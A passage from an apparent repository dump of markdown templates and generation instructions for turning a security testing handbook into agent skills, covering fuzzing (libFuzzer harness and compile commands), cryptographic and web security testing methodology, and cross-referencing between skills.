fuzzer...\"         # From frontmatter\n  has_resources: true                          # Has 99-resources.md\n  estimated_lines: 350                         # Approximate output size\n```\n\n**Variable mapping to agent prompt:**\n\n| Package Field | Agent Prompt Variable | Example |\n|---------------|----------------------|---------|\n| `name` | `{name}` | `libfuzzer` |\n| `type` | `{type}` | `fuzzer` |\n| `pass` | `{pass}` | `1` or `2` |\n| `handbook_path` | `{handbook_path}` | `/path/to/testing-handbook` |\n| `section_path` | `{section_path}` | `fuzzing/c-cpp/10-libfuzzer` |\n| `output_dir` | `{output_dir}` | `/path/to/skills/plugins/testing-handbook-skills/skills` |\n| `template_path` | `{template_path}` | `skills/testing-handbook-generator/templates/fuzzer-skill.md` |\n| `related_sections` | `{related_sections}` | Comma-separated list or empty string |\n\n**Building the package:**\n\n```bash\n# Construct output_dir from current location\noutput_dir=\"$(cd .. && pwd)\"  # Parent of testing-handbook-generator\n\n# Construct template_path from type\ntemplate_path=\"skills/testing-handbook-generator/templates/${type}-skill.md\"\n\n# Format related sections (empty string if none)\nif [ ${#related_sections[@]} -eq 0 ]; then\n  related_sections=\"\"\nelse\n  related_sections=$(IFS=', '; echo \"${related_sections[*]}\")\nfi\n```\n\n### 3.6 Pre-Generation Validation\n\nBefore launching generation agents, verify:\n\n```\nFor each skill candidate:\n Primary content exists and is non-empty\n Frontmatter has title and summary\n At least one code block present (for tool/fuzzer types)\n No unresolved Hugo shortcodes in source content\n Related sections (if any) are accessible\n Template file exists for skill type\n```\n\n**If validation fails:**\n- Log the specific failure\n- Move candidate to \"Skipped Sections\" with reason\n- Continue with remaining candidates\n\n### 3.7 Launch Generation\n\n**Trigger conditions:**\n- User has approved plan (explicit confirmation)\n- All source paths verified accessible\n- All per-skill packages prepared\n\n**Launch sequence:**\n1. Launch Pass 1 agents in parallel (content generation)\n2. Wait for all Pass 1 agents to complete\n3. Run Pass 2 (cross-reference population) - see [SKILL.md](SKILL.md#two-pass-generation-phase-3)\n4. Run validator on all generated skills\n\n### 3.8 Success Criteria\n\nPhase 3 complete when:\n- [ ] All skill packages prepared with variables\n- [ ] Pass 1 agents launched and completed\n- [ ] Pass 2 cross-references populated\n- [ ] All generated skills pass validation\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/domain-skill.md": "# Domain Skill Template\n\nUse this template for domain-specific security testing (cryptographic testing, web security methodologies, etc.).\n\n## Template Structure\n\n```markdown\n---\nname: {domain-name-lowercase}\ntype: domain\ndescription: >\n  {Summary of domain and testing approach}. Use when {trigger conditions}.\n---\n\n# {Domain Name}\n\n{Brief introduction to the domain and why specialized testing matters}\n\n## Background\n\n{Theory and context needed to understand this domain}\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| {Concept 1} | {Explanation} |\n| {Concept 2} | {Explanation} |\n| {Concept 3} | {Explanation} |\n\n### Why This Matters\n\n{Security implications of getting this wrong - real-world impact}\n\n## When to Use\n\n**Apply this methodology when:**\n- {Trigger 1}\n- {Trigger 2}\n- {Trigger 3}\n\n**Consider alternatives when:**\n- {Alternative condition 1}\n- {Alternative condition 2}\n\n## Quick Reference\n\n{Decision aid for choosing tools and approaches}\n\n| Scenario | Recommended Approach | Skill |\n|----------|---------------------|-------|\n| {Scenario 1} | {Approach} | **{skill-name}** |\n| {Scenario 2} | {Approach} | **{skill-name}** |\n| {Scenario 3} | {Approach} | **{skill-name}** |\n\n## Testing Workflow\n\n{High-level workflow showing how tools and techniques fit together}\n\n\\```\nPhase 1: {Phase Name}         Phase 2: {Phase Name}\n          \n {Description}             {Description}   \n Tool: {name}               Tool: {name}    \n          \n                                     \nPhase 3: {Phase Name}         Phase 4: {Phase Name}\n          \n {Description}             {Description}   \n Tool: {name}               Technique: {n}  \n          \n\\```\n\n## Tools and Approaches\n\n{Overview of tools/methods available for this domain}\n\n| Tool/Approach | Purpose | Complexity | Skill |\n|---------------|---------|------------|-------|\n| {Tool 1} | {Purpose} | {Level} | **{skill-name}** |\n| {Tool 2} | {Purpose} | {Level} | **{skill-name}** |\n| {Tool 3} | {Purpose} | {Level} | **{skill-name}** |\n\n### {Tool/Approach 1}\n\n{Brief overview of this tool in the domain context}\n\n> **Detailed Guidance:** See the **{tool-skill-name}** skill for installation,\n> configuration, and usage details.\n\n#### Quick Start for {Domain}\n\n\\```bash\n{Domain-specific usage command}\n\\```\n\n#### Domain-Specific Configuration\n\n\\```{format}\n{Config specific to this domain use case}\n\\```\n\n### {Tool/Approach 2}\n\n{Brief overview}\n\n> **Detailed Guidance:** See the **{tool-skill-name}** skill.\n\n#### Quick Start for {Domain}\n\n\\```bash\n{Domain-specific usage command}\n\\```\n\n## Key Techniques\n\n{Techniques that apply to this domain - link to technique skills}\n\n| Technique | When to Apply | Skill |\n|-----------|---------------|-------|\n| {Technique 1} | {When} | **{technique-skill-name}** |\n| {Technique 2} | {When} | **{technique-skill-name}** |\n| {Technique 3} | {When} | **{technique-skill-name}** |\n\n### Applying {Technique 1} to {Domain}\n\n{How this technique specifically applies to the domain}\n\n> **See Also:** For detailed technique guidance, see the **{technique-skill}** skill.\n\n\\```{language}\n{Domain-specific example}\n\\```\n\n## Implementation Guide\n\n{Step-by-step for applying this methodology}\n\n### Phase 1: {First Phase}\n\n{Instructions}\n\n**Tools to use:** {tool-name}, {tool-name}\n**Techniques to apply:** {technique-name}\n\n### Phase 2: {Second Phase}\n\n{Instructions}\n\n### Phase 3: {Third Phase}\n\n{Instructions}\n\n## Common Vulnerabilities\n\n{What to look for in this domain}\n\n| Vulnerability | Description | Detection | Severity |\n|---------------|-------------|-----------|----------|\n| {Vuln 1} | {Description} | {Tool/technique} | {Level} |\n| {Vuln 2} | {Description} | {Tool/technique} | {Level} |\n| {Vuln 3} | {Description} | {Tool/technique} | {Level} |\n\n### {Vulnerability 1}: Deep Dive\n\n{Detailed explanation of the vulnerability}\n\n**How to detect:**\n\n\\```{language}\n{Detection code or command}\n\\```\n\n**Related skill:** **{skill-name}**\n\n## Case Studies\n\n{Real-world examples from handbook}\n\n### Case Study: {Name 1}\n\n{Description of vulnerability and testing approach}\n\n**Tools used:** {tool-list}\n**Techniques applied:** {technique-list}\n\n### Case Study: {Name 2}\n\n{Description}\n\n## Advanced Usage\n\n### Tips and Tricks\n\n{Domain-specific tips from experienced practitioners}\n\n| Tip | Why It Helps |\n|-----|--------------|\n| {Tip 1} | {Explanation} |\n| {Tip 2} | {Explanation} |\n| {Tip 3} | {Explanation} |\n\n### Common Mistakes\n\n| Mistake | Why It's Wrong | Correct Approach |\n|---------|----------------|------------------|\n| {Mistake 1} | {Reason} | {Fix} |\n| {Mistake 2} | {Reason} | {Fix} |\n\n## Related Skills\n\n{Comprehensive links to all relevant tools and techniques - KEY for discoverability}\n\n### Tool Skills\n\n{Tools commonly used in this domain}\n\n| Skill | Primary Use in {Domain} |\n|-------|-------------------------|\n| **{tool-skill-1}** | {How this tool is used in the domain} |\n| **{tool-skill-2}** | {How this tool is used in the domain} |\n| **{tool-skill-3}** | {How this tool is used in the domain} |\n\n### Technique Skills\n\n{Techniques that apply to this domain}\n\n| Skill | When to Apply |\n|-------|---------------|\n| **{technique-skill-1}** | {Specific application in this domain} |\n| **{technique-skill-2}** | {Specific application in this domain} |\n| **{technique-skill-3}** | {Specific application in this domain} |\n\n### Related Domain Skills\n\n{Other domains that share overlap}\n\n| Skill | Relationship |\n|-------|--------------|\n| **{domain-skill-1}** | {How they relate - e.g., \"Crypto testing often overlaps with...\"} |\n| **{domain-skill-2}** | {How they relate} |\n\n## Skill Dependency Map\n\n{Visual representation of how skills work together in this domain}\n\n\\```\n                    \n                       {Domain Skill}    \n                       (this skill)      \n                    \n                               \n           \n                                                 \n                                                 \n  \n  {Tool Skill 1}    {Tool Skill 2}    {Tool Skill 3} \n  \n                                               \n         \n                             \n                             \n              \n                 Technique Skills       \n                {tech-1}, {tech-2}, ... \n              \n\\```\n\n## Resources\n\n### Key External Resources\n\n{For each non-video URL: fetch with WebFetch, summarize key insights}\n\n**[{Title 1}]({URL})**\n{Summarized insights from fetched content}\n\n**[{Title 2}]({URL})**\n{Summarized insights from fetched content}\n\n### Video Resources\n\n{Videos - title and URL only, no fetching}\n\n- [{Video Title}]({YouTube/Vimeo URL}) - {Brief description}\n```\n\n## Field Extraction Guide\n\n| Template Field | Handbook Source |\n|----------------|-----------------|\n| `{domain-name-lowercase}` | Slugified from section name |\n| Background | From handbook intro and theory sections |\n| Tools and Approaches | From tool subsections |\n| Common Vulnerabilities | Extract from handbook or related resources |\n| Case Studies | From handbook examples |\n| Related Skills | Map to all tool and technique skills in the domain |\n\n## Skill Reference Mapping\n\nWhen generating a domain skill, map to relevant tool and technique skills:\n\n| Domain | Tool Skills | Technique Skills |\n|--------|-------------|------------------|\n| Cryptography | wycheproof, constant-time-testing, cryptofuzz | coverage-analysis, property-based-testing |\n| Fuzzing (general) | libfuzzer, aflpp, honggfuzz | fuzz-harness-writing, address-sanitizer, coverage-analysis |\n| Web Security | semgrep, nuclei | - |\n| Static Analysis | semgrep, codeql, bandit | - |\n\n## Example: Cryptographic Testing\n\n```markdown\n---\nname: crypto-testing\ntype: domain\ndescription: >\n  Methodology for testing cryptographic implementations.\n  Use when auditing crypto code, validating implementations, or testing for timing attacks.\n---\n\n# Cryptographic Testing\n\nCryptographic code requires specialized testing beyond standard security scanning.\nSubtle bugs in crypto implementations can completely undermine security.\n\n## Background\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| Test vector | Input/output pair for validating crypto implementation |\n| Timing attack | Exploiting execution time variations to extract secrets |\n| Constant-time | Code that executes in same time regardless of secret values |\n\n### Why This Matters\n\nCryptographic bugs can:\n- Expose private keys\n- Allow signature forgery\n- Enable message decryption\n- Leak secret values through side channels\n\n## Quick Reference\n\n| Scenario | Recommended Approach | Skill |\n|----------|---------------------|-------|\n| Validate crypto primitives | Wycheproof test vectors | **wycheproof** |\n| Check for timing leaks | Constant-time analysis | **constant-time-testing** |\n| Fuzz crypto parsers | Coverage-guided fuzzing | **libfuzzer** |\n| Find edge cases | Property-based testing | **property-based-testing** |\n\n## Testing Workflow\n\n\\```\nPhase 1: Static Analysis      Phase 2: Test Vectors\n          \n Identify crypto           Run Wycheproof  \n Tool: semgrep              Tool: wycheproof\n          \n                                     \nPhase 4: Fuzzing              Phase 3: Timing Analysis\n          \n Edge case bugs            Side-channel    \n Tool: libfuzzer            Tool: CT tools  \n          \n\\```\n\n## Tools and Approaches\n\n| Tool/Approach | Purpose | Complexity | Skill |\n|---------------|---------|------------|-------|\n| Wycheproof | Validate implementations | Low | **wycheproof** |\n| Constant-time tools | Detect timing leaks | Medium | **constant-time-testing** |\n| libFuzzer | Find edge case bugs | Medium | **libfuzzer** |\n\n### Wycheproof Test Vectors\n\nTest vectors cover ECDSA, RSA, AES-GCM, ECDH, and more.\n\n> **Detailed Guidance:** See the **wycheproof** skill for setup and usage.\n\n#### Quick Start for Crypto Testing\n\n\\```bash\ngit clone https://github.com/google/wycheproof\n# See wycheproof skill for integration patterns\n\\```\n\n### Constant-Time Analysis\n\nEssential for code handling secrets.\n\n> **Detailed Guidance:** See the **constant-time-testing** skill for tools and techniques.\n\n## Common Vulnerabilities\n\n| Vulnerability | Description | Detection | Severity |\n|---------------|-------------|-----------|----------|\n| Timing side-channel | Execution varies with secrets | constant-time-testing | HIGH |\n| Signature malleability | Multiple valid signatures | wycheproof | MEDIUM |\n| Invalid curve attack | ECDH with bad points | wycheproof | CRITICAL |\n\n## Related Skills\n\n### Tool Skills\n\n| Skill | Primary Use in Crypto Testing |\n|-------|-------------------------------|\n| **wycheproof** | Validate implementations against known test vectors |\n| **constant-time-testing** | Detect timing side-channels in crypto code |\n| **libfuzzer** | Fuzz crypto parsers and edge cases |\n| **semgrep** | Find insecure crypto patterns statically |\n\n### Technique Skills\n\n| Skill | When to Apply |\n|-------|---------------|\n| **coverage-analysis** | Measure test coverage of crypto code |\n| **property-based-testing** | Test mathematical properties (e.g., decrypt(encrypt(x)) == x) |\n| **fuzz-harness-writing** | Write harnesses for crypto functions |\n\n## Skill Dependency Map\n\n\\```\n                    \n                       crypto-testing    \n                       (this skill)      \n                    \n                               \n           \n                                                 \n                                                 \n  \n   wycheproof      constant-time       libfuzzer     \n  \n                                               \n         \n                             \n                             \n              \n                 Technique Skills       \n               coverage, harness, PBT   \n              \n\\```\n\n...\n```\n\n## Example: Web Security Testing\n\n```markdown\n---\nname: web-security-testing\ntype: domain\ndescription: >\n  Methodology for web application security testing.\n  Use when auditing web apps, APIs, or web-based services.\n---\n\n# Web Security Testing\n\n...\n\n## Quick Reference\n\n| Scenario | Recommended Approach | Skill |\n|----------|---------------------|-------|\n| Automated scanning | Nuclei templates | **nuclei** |\n| API fuzzing | API-specific tools | **api-fuzzing** |\n| Code review | Semgrep rules | **semgrep** |\n\n## Related Skills\n\n### Tool Skills\n\n| Skill | Primary Use in Web Security |\n|-------|----------------------------|\n| **semgrep** | Find OWASP Top 10 patterns in code |\n| **sqlmap** | Automated SQL injection testing |\n| **nuclei** | Template-based vulnerability scanning |\n\n### Technique Skills\n\n| Skill | When to Apply |\n|-------|---------------|\n| **fuzz-harness-writing** | Create harnesses for web parsers |\n| **property-based-testing** | Test input validation logic |\n\n...\n```\n\n## Notes\n\n- Domain skills often need more background/theory than tool skills\n- Include vulnerability patterns specific to the domain\n- ALWAYS link to tool skills that implement methodology steps\n- ALWAYS link to technique skills that apply to the domain\n- Include Quick Reference table mapping scenarios to skills\n- Include Skill Dependency Map showing relationships\n- Include Testing Workflow showing how skills fit together\n- Keep under 500 lines - split into supporting files if needed\n- Fetch non-video external resources with WebFetch, extract key insights\n- For videos (YouTube, Vimeo): include title/URL only, do not fetch\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/fuzzer-skill.md": "# Fuzzer Skill Template\n\nUse this template for language-specific fuzzers (libFuzzer, AFL++, cargo-fuzz, etc.).\n\n## Template Structure\n\n```markdown\n---\nname: {fuzzer-name-lowercase}\ntype: fuzzer\ndescription: >\n  {Summary from handbook}. Use for fuzzing {language} projects.\n---\n\n# {Fuzzer Name}\n\n{Brief introduction from handbook - what this fuzzer is and its key differentiator}\n\n## When to Use\n\n{Comparison with other fuzzers for the same language}\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| {This fuzzer} | {Use case} | {Level} |\n| {Alternative 1} | {Use case} | {Level} |\n| {Alternative 2} | {Use case} | {Level} |\n\n**Choose {Fuzzer Name} when:**\n- {Criterion 1}\n- {Criterion 2}\n\n## Quick Start\n\n{Minimal working example - get fuzzing in <5 minutes}\n\n\\```{language}\n{Minimal harness code}\n\\```\n\nCompile and run:\n\\```bash\n{Minimal commands to compile and run}\n\\```\n\n## Installation\n\n{Platform-specific installation instructions}\n\n### Prerequisites\n\n- {Prerequisite 1}\n- {Prerequisite 2}\n\n### Linux/macOS\n\n\\```bash\n{Installation commands}\n\\```\n\n### Verification\n\n\\```bash\n{Command to verify installation}\n\\```\n\n## Writing a Harness\n\n{How to write a fuzzing harness for this fuzzer}\n\n### Harness Structure\n\n\\```{language}\n{Standard harness template with comments}\n\\```\n\n### Harness Rules\n\n{Key rules from handbook - what to do and avoid in harness}\n\n| Do | Don't |\n|----|-------|\n| {Good practice 1} | {Bad practice 1} |\n| {Good practice 2} | {Bad practice 2} |\n\n> **See Also:** For detailed harness writing techniques, patterns for handling complex inputs,\n> and advanced strategies, see the **fuzz-harness-writing** technique skill.\n\n## Compilation\n\n{How to compile fuzz targets}\n\n### Basic Compilation\n\n\\```bash\n{Basic compile command}\n\\```\n\n### With Sanitizers\n\n\\```bash\n{Compile with ASan/UBSan}\n\\```\n\n> **See Also:** For detailed sanitizer configuration, common issues, and advanced flags,\n> see the **address-sanitizer** and **undefined-behavior-sanitizer** technique skills.\n\n### Build Flags\n\n| Flag | Purpose |\n|------|---------|\n| {Flag 1} | {Purpose} |\n| {Flag 2} | {Purpose} |\n\n## Corpus Management\n\n{How to create and manage input corpus}\n\n### Creating Initial Corpus\n\n{Where to get seed inputs}\n\n\\```bash\n{Commands for corpus setup}\n\\```\n\n### Corpus Minimization\n\n\\```bash\n{Commands to minimize corpus}\n\\```\n\n> **See Also:** For corpus creation strategies, dictionaries, and seed selection,\n> see the **fuzzing-corpus** technique skill.\n\n## Running Campaigns\n\n{How to run fuzzing campaigns}\n\n### Basic Run\n\n\\```bash\n{Basic run command}\n\\```\n\n### Multi-Core Fuzzing\n\n\\```bash\n{Parallel fuzzing command if supported}\n\\```\n\n### Interpreting Output\n\n{How to read fuzzer output, coverage, crashes}\n\n| Output | Meaning |\n|--------|---------|\n| {Output indicator 1} | {What it means} |\n| {Output indicator 2} | {What it means} |\n\n## Coverage Analysis\n\n{How to measure and improve coverage}\n\n### Generating Coverage Reports\n\n\\```bash\n{Coverage commands}\n\\```\n\n### Improving Coverage\n\n{Tips for reaching more code paths}\n\n> **See Also:** For detailed coverage analysis techniques, identifying coverage gaps,\n> and systematic coverage improvement, see the **coverage-analysis** technique skill.\n\n## Sanitizer Integration\n\n{How to use AddressSanitizer, UndefinedBehaviorSanitizer, etc.}\n\n### AddressSanitizer (ASan)\n\n\\```bash\n{ASan compile flags}\n\\```\n\n### UndefinedBehaviorSanitizer (UBSan)\n\n\\```bash\n{UBSan compile flags}\n\\```\n\n### MemorySanitizer (MSan)\n\n\\```bash\n{MSan compile flags - if applicable}\n\\```\n\n### Common Sanitizer Issues\n\n| Issue | Solution |\n|-------|----------|\n| {Issue 1} | {Fix} |\n| {Issue 2} | {Fix} |\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| {Tip 1} | {Explanation} |\n| {Tip 2} | {Explanation} |\n| {Tip 3} | {Explanation} |\n\n### {Advanced Topic 1 - e.g., Structure-Aware Fuzzing}\n\n{Details}\n\n### {Advanced Topic 2 - e.g., Custom Mutators}\n\n{Details}\n\n### Performance Tuning\n\n{How to maximize fuzzing throughput}\n\n| Setting | Impact |\n|---------|--------|\n| {Setting 1} | {Effect} |\n| {Setting 2} | {Effect} |\n\n## Real-World Examples\n\n{Examples from handbook of fuzzing real projects}\n\n### Example: {Project Name}\n\n{Context and what we're fuzzing}\n\n\\```{language}\n{Harness code}\n\\```\n\n\\```bash\n{Commands to fuzz example project}\n\\```\n\n## Troubleshooting\n\n{Common issues and solutions from handbook}\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| {Problem 1} | {Cause} | {Solution} |\n| {Problem 2} | {Cause} | {Solution} |\n| {Problem 3} | {Cause} | {Solution} |\n\n## Related Skills\n\n{Cross-references to technique skills that complement this fuzzer}\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Detailed guidance on writing effective harnesses |\n| **address-sanitizer** | Memory error detection during fuzzing |\n| **coverage-analysis** | Measuring and improving code coverage |\n| **fuzzing-corpus** | Building and managing seed corpora |\n| **fuzzing-dictionaries** | Creating dictionaries for format-aware fuzzing |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **{alternative-fuzzer-1}** | {When this alternative is better} |\n| **{alternative-fuzzer-2}** | {When this alternative is better} |\n\n## Resources\n\n{From resources section - fetch non-video URLs with WebFetch}\n\n### Key External Resources\n\n{For each non-video URL: fetch with WebFetch, summarize key insights}\n\n**[{Title 1}]({URL})**\n{Summarized insights: setup guides, tips, examples extracted from the page}\n\n**[{Title 2}]({URL})**\n{Summarized insights from fetched content}\n\n### Video Resources\n\n{Videos - title and URL only, no fetching}\n\n- [{Video Title}]({YouTube/Vimeo URL}) - {Brief description}\n```\n\n## Field Extraction Guide\n\n| Template Field | Handbook Source |\n|----------------|-----------------|\n| `{fuzzer-name-lowercase}` | Slugified directory name (e.g., `libfuzzer`, `aflpp`) |\n| `{Summary from handbook}` | From `index.md` frontmatter or first paragraph |\n| `{language}` | Parent directory (e.g., `c-cpp`  C/C++, `rust`  Rust) |\n| Quick Start | Extract minimal example from handbook |\n| Harness | From handbook or link to techniques/writing-harnesses |\n| Sanitizers | From handbook or link to techniques/asan |\n| Real-World Examples | From handbook examples section |\n| Related Skills | Map to other handbook sections that complement this fuzzer |\n\n## Related Skills Mapping\n\nWhen generating a fuzzer skill, identify and link to these technique skills:\n\n| Handbook Section | Generated Skill Name | Link Context |\n|------------------|---------------------|--------------|\n| `/fuzzing/techniques/writing-harnesses/` | `fuzz-harness-writing` | Harness section |\n| `/fuzzing/techniques/asan/` | `address-sanitizer` | Sanitizer section |\n| `/fuzzing/techniques/ubsan/` | `undefined-behavior-sanitizer` | Sanitizer section |\n| `/fuzzing/techniques/coverage/` | `coverage-analysis` | Coverage section |\n| `/fuzzing/techniques/corpus/` | `fuzzing-corpus` | Corpus section |\n| `/fuzzing/techniques/dictionaries/` | `fuzzing-dictionaries` | Corpus section |\n\n## Example: libFuzzer\n\n```markdown\n---\nname: libfuzzer\ntype: fuzzer\ndescription: >\n  Coverage-guided fuzzer built into LLVM. Use for fuzzing C/C++ projects\n  that can be compiled with Clang.\n---\n\n# libFuzzer\n\nlibFuzzer is an in-process, coverage-guided fuzzer that is part of the LLVM project.\nIt's the recommended starting point for fuzzing C/C++ projects due to its simplicity\nand integration with the LLVM toolchain.\n\n## When to Use\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| libFuzzer | Quick setup, single-threaded | Low |\n| AFL++ | Multi-core, diverse mutations | Medium |\n| LibAFL | Custom fuzzers, research | High |\n\n**Choose libFuzzer when:**\n- You need a simple, quick setup\n- Project uses Clang for compilation\n- Single-threaded fuzzing is sufficient\n\n## Quick Start\n\n\\```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Call your code with fuzzer-provided data\n    my_function(data, size);\n    return 0;\n}\n\\```\n\nCompile and run:\n\\```bash\nclang++ -fsanitize=fuzzer,address harness.cc target.cc -o fuzz_target\n./fuzz_target corpus/\n\\```\n\n## Writing a Harness\n\n### Harness Structure\n\n\\```c++\n#include <stdint.h>\n#include <stddef.h>\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // 1. Validate input size if needed\n    if (size < MIN_SIZE) return 0;\n\n    // 2. Call target function with fuzz data\n    target_function(data, size);\n\n    // 3. Return 0 (non-zero reserved for future use)\n    return 0;\n}\n\\```\n\n### Harness Rules\n\n| Do | Don't |\n|----|-------|\n| Reset global state between runs | Rely on state from previous runs |\n| Handle edge cases gracefully | Exit on invalid input |\n| Keep harness deterministic | Use random number generators |\n| Free allocated memory | Create memory leaks |\n\n> **See Also:** For advanced harness patterns, handling complex inputs, and\n> structure-aware fuzzing, see the **fuzz-harness-writing** technique skill.\n\n## Sanitizer Integration\n\n### AddressSanitizer (ASan)\n\n\\```bash\nclang++ -fsanitize=fuzzer,address -g harness.cc -o fuzz_target\n\\```\n\n### Common Sanitizer Issues\n\n| Issue | Solution |\n|-------|----------|\n| ASan slows fuzzing | Use `-fsanitize-recover=address` for non-fatal errors |\n| Stack exhaustion | Increase stack with `ASAN_OPTIONS=stack_size=...` |\n\n> **See Also:** For comprehensive sanitizer configuration and troubleshooting,\n> see the **address-sanitizer** technique skill.\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Advanced harness patterns and structure-aware fuzzing |\n| **address-sanitizer** | Memory error detection configuration |\n| **coverage-analysis** | Measuring fuzzing effectiveness |\n| **fuzzing-corpus** | Seed corpus creation and management |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **aflpp** | Multi-core fuzzing or when libFuzzer plateaus |\n| **honggfuzz** | Hardware-based coverage on Linux |\n\n...\n```\n\n## Notes\n\n- Always include sanitizer section (ASan is essential for fuzzing)\n- ALWAYS include Related Skills section linking to technique skills\n- Use \"See Also\" callouts in relevant sections pointing to technique skills\n- Keep total lines under 500\n- Include comparison with other fuzzers for same language\n- Fetch non-video external resources with WebFetch, extract key insights\n- For videos (YouTube, Vimeo): include title/URL only, do not fetch\n- Related skills help users discover deeper content on harnesses, sanitizers, etc.\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/technique-skill.md": "# Technique Skill Template\n\nUse this template for cross-cutting techniques that apply to multiple tools (harness writing, coverage analysis, sanitizers, dictionaries, etc.).\n\n## Template Structure\n\n```markdown\n---\nname: {technique-name-lowercase}\ntype: technique\ndescription: >\n  {Summary of what this technique does}. Use when {trigger conditions}.\n---\n\n# {Technique Name}\n\n{Brief introduction - what this technique is and why it matters}\n\n## Overview\n\n{High-level explanation of the technique}\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| {Concept 1} | {Brief explanation} |\n| {Concept 2} | {Brief explanation} |\n\n## When to Apply\n\n**Apply this technique when:**\n- {Trigger 1}\n- {Trigger 2}\n- {Trigger 3}\n\n**Skip this technique when:**\n- {Skip condition 1}\n- {Skip condition 2}\n\n## Quick Reference\n\n{Essential commands or patterns in one place}\n\n| Task | Command/Pattern |\n|------|-----------------|\n| {Task 1} | `{command or pattern}` |\n| {Task 2} | `{command or pattern}` |\n| {Task 3} | `{command or pattern}` |\n\n## Step-by-Step\n\n{Detailed workflow for applying this technique}\n\n### Step 1: {First Step}\n\n{Instructions with code examples}\n\n\\```{language}\n{Example code}\n\\```\n\n### Step 2: {Second Step}\n\n{Instructions}\n\n### Step 3: {Third Step}\n\n{Instructions}\n\n## Common Patterns\n\n{Code patterns that demonstrate this technique}\n\n### Pattern: {Pattern Name 1}\n\n**Use Case:** {When to use this pattern}\n\n**Before:**\n\\```{language}\n{Code before applying technique}\n\\```\n\n**After:**\n\\```{language}\n{Code after applying technique}\n\\```\n\n### Pattern: {Pattern Name 2}\n\n**Use Case:** {When to use this pattern}\n\n**Before:**\n\\```{language}\n{Code before}\n\\```\n\n**After:**\n\\```{language}\n{Code after}\n\\```\n\n## Advanced Usage\n\n### Tips and Tricks\n\n{Practical tips from experienced practitioners}\n\n| Tip | Why It Helps |\n|-----|--------------|\n| {Tip 1} | {Explanation} |\n| {Tip 2} | {Explanation} |\n| {Tip 3} | {Explanation} |\n\n### {Advanced Topic 1}\n\n{Details}\n\n### {Advanced Topic 2}\n\n{Details}\n\n## Anti-Patterns\n\n{What NOT to do}\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| {Bad practice 1} | {Why it's bad} | {What to do instead} |\n| {Bad practice 2} | {Why it's bad} | {What to do instead} |\n| {Bad practice 3} | {Why it's bad} | {What to do instead} |\n\n## Tool-Specific Guidance\n\n{How this technique applies to specific fuzzers/tools - this is KEY for discoverability}\n\n### libFuzzer\n\n{Specific guidance for libFuzzer}\n\n\\```bash\n{libFuzzer-specific command}\n\\```\n\n**Integration tips:**\n- {Tip specific to libFuzzer}\n- {Tip specific to libFuzzer}\n\n### AFL++\n\n{Specific guidance for AFL++}\n\n\\```bash\n{AFL++-specific command}\n\\```\n\n**Integration tips:**\n- {Tip specific to AFL++}\n- {Tip specific to AFL++}\n\n### cargo-fuzz (Rust)\n\n{Specific guidance for Rust fuzzing}\n\n\\```bash\n{cargo-fuzz command}\n\\```\n\n**Integration tips:**\n- {Tip specific to cargo-fuzz}\n\n### go-fuzz (Go)\n\n{Specific guidance for Go fuzzing}\n\n\\```bash\n{go-fuzz command}\n\\```\n\n### {Other Tool}\n\n{Add sections for other relevant tools from handbook}\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| {Issue 1} | {Cause} | {Fix} |\n| {Issue 2} | {Cause} | {Fix} |\n| {Issue 3} | {Cause} | {Fix} |\n\n## Related Skills\n\n{Links to tools and other techniques - bidirectional references}\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **{fuzzer-skill-1}** | {How this technique is used with this fuzzer} |\n| **{fuzzer-skill-2}** | {How this technique is used with this fuzzer} |\n| **{tool-skill-1}** | {How this technique applies to this tool} |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **{technique-skill-1}** | {How they work together - e.g., \"Use coverage to identify where harness improvements are needed\"} |\n| **{technique-skill-2}** | {Complementary relationship} |\n\n## Resources\n\n### Key External Resources\n\n{For each non-video URL: fetch with WebFetch, summarize key insights}\n\n**[{Title 1}]({URL})**\n{Summarized insights from fetched content}\n\n### Video Resources\n\n{Videos - title and URL only, no fetching}\n\n- [{Video Title}]({YouTube/Vimeo URL}) - {Brief description}\n```\n\n## Field Extraction Guide\n\n| Template Field | Handbook Source |\n|----------------|-----------------|\n| `{technique-name-lowercase}` | Slugified from directory/title |\n| `{Summary}` | From `_index.md` frontmatter or intro |\n| Key Concepts | Extract definitions from handbook |\n| Step-by-Step | Main workflow from handbook |\n| Common Patterns | Code examples from handbook |\n| Tool Integration | From tool-specific subsections |\n| Related Skills | Map to fuzzer and tool skills |\n\n## Tool-Specific Section Guide\n\nInclude tool-specific guidance for tools covered in the handbook:\n\n| Language | Tools to Include |\n|----------|------------------|\n| C/C++ | libFuzzer, AFL++, honggfuzz |\n| Rust | cargo-fuzz, libFuzzer |\n| Go | go-fuzz, native fuzzing |\n| Python | Atheris, Hypothesis |\n| JavaScript | jsfuzz |\n\n## Related Skills Mapping\n\nWhen generating a technique skill, create bidirectional links:\n\n| If Technique Is About | Link To These Skills |\n|-----------------------|---------------------|\n| Harness writing | All fuzzer skills that use harnesses |\n| Sanitizers | All fuzzer skills (they all use sanitizers) |\n| Coverage | Fuzzer skills, static analysis tools |\n| Corpus/dictionaries | All fuzzer skills |\n\n## Example: Writing Fuzzing Harnesses\n\n```markdown\n---\nname: fuzz-harness-writing\ntype: technique\ndescription: >\n  Techniques for writing effective fuzzing 